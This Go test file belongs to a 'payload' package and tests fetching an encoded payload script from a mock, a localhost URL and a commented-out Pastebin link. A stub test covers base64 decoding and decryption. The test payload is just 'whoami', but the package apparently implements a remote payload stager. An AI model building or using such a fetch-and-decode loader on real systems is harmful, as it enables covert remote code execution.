package payload

import (
	"testing"
	"reflect"
)


/*
Test Payload fetching from Mock, and Pastebin url
*/
type MockPayloadFetcher struct {
	payload []byte
}
func (f MockPayloadFetcher) fetch() ([]byte) {
	return f.payload
}
func TestGetPayload(t *testing.T) {
	t.Run("it should fetch an encrypted/encoded payload script from a remote url", func(t *testing.T){
		payloadFetcher := MockPayloadFetcher{
			payload: []byte{'w', 'h', 'o', 'a', 'm', 'i'},}
		want := []byte{'w', 'h', 'o', 'a', 'm', 'i'}
		got := getPayload(payloadFetcher)
		if !reflect.DeepEqual(want, got) {
			t.Errorf("want %v, got %v", want, got)
		}
	})
	// t.Run("it should get `whoami` from `https://pastebin.com/raw/LEvuyuLn`", func(t *testing.T){
	// 	fetcher := PasteBinPayloadFetcher{url: `https://pastebin.com/raw/LEvuyuLn`}
	// 	want := []byte{'w', 'h', 'o', 'a', 'm', 'i'}
	// 	got := getPayload(fetcher)
	// 	if !reflect.DeepEqual(want, got) {
	// 		t.Errorf("want %v, got %v", want, got)
	// 	}	
	// })
	t.Run("it should get `whoami` from `http://localhost:8000/payload.txt`", func(t *testing.T){
		fetcher := PasteBinPayloadFetcher{url: `http://localhost:8000/payload.txt`}
		want := []byte{'w', 'h', 'o', 'a', 'm', 'i'}
		got := getPayload(fetcher)
		if !reflect.DeepEqual(want, got) {
			t.Errorf("want %v, got %v", want, got)
		}	
	})
}
/*
Test Payload fetching from Mock, and Pastebin url
END
*/

/*
Test Payload Decryption
*/

// func TestDecryptor(t *testing.T) {
// 	t.Run("it should decode a b64 string to clair text", func (t *testing.T) {
// 		want := []byte{'w', 'h', 'o', 'a', 'm', 'i'}
// 		//1. Open a file
// 		//2. Read content
// 		//3. B64decode
// 		//4. pass to decryptor
// 		got := decryptor()
// 	})
// }